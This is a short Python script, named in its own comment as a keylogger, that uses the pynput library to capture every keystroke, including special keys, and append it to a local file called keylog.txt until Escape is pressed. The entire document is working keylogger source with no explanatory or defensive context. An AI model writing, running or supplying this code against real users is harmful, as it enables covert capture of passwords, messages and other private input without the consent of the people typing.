import pynput.keyboard

# Function to write the keystrokes to a log file
def write_to_file(key):
    with open("keylog.txt", "a") as f:
        f.write(str(key))

# Function to handle key presses
def on_press(key):
    try:
        write_to_file(key.char)
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            write_to_file(" ")
        else:
            write_to_file(" [" + str(key) + "] ")

# Function to handle key releases
def on_release(key):
    if key == pynput.keyboard.Key.esc:
        # Stop listener
        return False

# Start the keylogger
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
